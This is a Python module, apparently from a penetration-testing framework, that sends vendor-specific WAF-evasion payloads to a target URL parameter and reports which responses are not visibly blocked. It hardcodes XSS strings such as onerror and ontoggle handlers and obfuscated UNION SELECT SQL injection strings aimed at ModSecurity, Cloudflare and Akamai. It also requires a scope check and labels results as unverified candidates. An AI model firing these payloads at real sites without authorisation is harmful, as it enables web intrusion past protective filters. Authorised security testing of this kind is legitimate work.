"""Universal WAF bypass engine — vendor-aware payload mutation."""
from __future__ import annotations
import asyncio
from typing import Any
from talisman.engine.scope import ScopeViolationError
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.payload_engine import PayloadEngine
from talisman.modules.waf.vendors import cloudflare, akamai
from talisman.utils.logger import get_logger, console

log = get_logger(__name__)

MODSECURITY_XSS_BYPASSES = [
 "<img\rsrc=x\ronerror=alert(1)>",
 "<img\tsrc=x\tonerror=alert(1)>",
 "<img src onerror=alert(1)>",
 "<script>onerror=alert;throw 1</script>",
 "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
 "<details/open/ontoggle=alert(1)>",
]

MODSECURITY_SQLI_BYPASSES = [
 "1/**/UNION/**/SELECT/**/1,2,3",
 "1%0bUNION%0bSELECT%0b1",
 "1\x0cUNION\x0cSELECT\x0c1",
 "1.0 UNION SELECT 1e0,2e0,3e0--",
 "1||1=1",
 "1&&1=1",
]

VENDOR_BYPASS_MAP: dict[str, dict[str, list[str]]] = {
 "Cloudflare": {
  "xss": cloudflare.get_xss_bypasses(),
  "sqli": cloudflare.get_sqli_bypasses(),
 },
 "Akamai": {
  "xss": akamai.get_xss_bypasses(),
  "sqli": akamai.get_sqli_bypasses(),
  "lfi": akamai.get_traversal_bypasses(),
 },
 "ModSecurity": {
  "xss": MODSECURITY_XSS_BYPASSES,
  "sqli": MODSECURITY_SQLI_BYPASSES,
 },
}


async def _score_payload(
 url: str, param: str, payload: str, client: TalismanHTTPClient
) -> dict[str, Any]:
 import urllib.parse
 parsed = urllib.parse.urlparse(url)
 base = dict(urllib.parse.parse_qsl(parsed.query))
 test_params = {**base, param: payload}
 test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
 try:
  r = await client.get(test_url, timeout=10)
  blocked = r.status_code in (403, 406, 429, 503)
  waf_page = any(
   kw in r.text.lower()
   for kw in ["blocked", "forbidden", "access denied", "cloudflare", "incapsula"]
  )
  not_blocked = not blocked and not waf_page
  return {
   "payload": payload,
   "param": param,
   "status": r.status_code,
   "passed": not_blocked,
   "not_blocked": not_blocked,
   "blocked": blocked or waf_page,
   "confidence": "candidate",
   "requires_application_verification": True,
   "verification_required": (
    "A response that is not an obvious WAF block page does not prove the "
    "payload reached an interpreter or changed application behavior. Verify "
    "a harmless, application-specific effect before claiming a WAF bypass."
   ),
  }
 except Exception as e:
  return {"payload": payload, "param": param, "status": 0, "passed": False, "blocked": False, "error": str(e)}


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 waf: str = "auto",
 vuln_type: str = "xss",
 **kwargs: Any,
) -> dict[str, Any]:
 url = target if "://" in target else f"https://{target}"
 if scope is None:
  return {
   "target": url,
   "bypasses": [],
   "candidates": [],
   "findings": [],
   "count": 0,
   "error": "scope_enforcer_required",
  }
 try:
  scope.assert_in_scope(url)
 except ScopeViolationError as exc:
  return {
   "target": url,
   "bypasses": [],
   "candidates": [],
   "findings": [],
   "count": 0,
   "error": str(exc),
  }

 param = kwargs.get("param", "q")
 if not isinstance(param, str) or not param or len(param) > 128:
  return {
   "target": url,
   "bypasses": [],
   "candidates": [],
   "findings": [],
   "count": 0,
   "error": "param must be a non-empty string of at most 128 characters",
  }

 console.print(
  f"\n[module][+] WAF Response-Handling Assessment[/module] -> "
  f"[target]{url}[/target] ({waf})"
 )

 if waf == "auto" or waf not in VENDOR_BYPASS_MAP:
  from talisman.utils.payload_engine import XSS_PAYLOADS, SQLI_PAYLOADS
  payloads = (
   XSS_PAYLOADS.get("waf_bypass", []) if vuln_type == "xss"
   else SQLI_PAYLOADS.get("waf_bypass", [])
  )
 else:
  payloads = VENDOR_BYPASS_MAP.get(waf, {}).get(vuln_type, [])

 if not payloads:
  console.print(" [dim]No vendor-specific payloads available[/dim]")
  return {
   "target": url,
   "bypasses": [],
   "candidates": [],
   "findings": [],
   "count": 0,
   "waf": waf,
  }

 candidates: list[dict[str, Any]] = []
 async with TalismanHTTPClient(
  proxy=proxy,
  timeout=12,
  scope=scope,
 ) as client:
  sem = asyncio.Semaphore(min(20, scope.config.max_concurrent_requests))

  async def score_one(payload: str) -> dict[str, Any] | None:
   async with sem:
    return await _score_payload(url, param, payload, client)

  results = await asyncio.gather(
   *(score_one(payload) for payload in payloads[:20]),
   return_exceptions=True,
  )
  for result in results:
   if isinstance(result, dict) and result.get("not_blocked"):
    candidates.append(result)
    console.print(
     f" [success][+] Response not visibly blocked (candidate):[/success] "
     f"{result['payload'][:80]}"
    )

 console.print(
  f" {len(candidates)}/{min(len(payloads), 20)} responses were not visibly blocked; "
  "application behavior still requires verification"
 )
 return {
  "target": url,
  "waf": waf,
  "vuln_type": vuln_type,
  "tested": min(len(payloads), 20),
  "candidates": candidates,
  "responses_not_blocked": candidates,
  "bypasses": candidates,
  "findings": [],
  "count": 0,
  "candidate_count": len(candidates),
  "confirmed_bypasses": 0,
 }
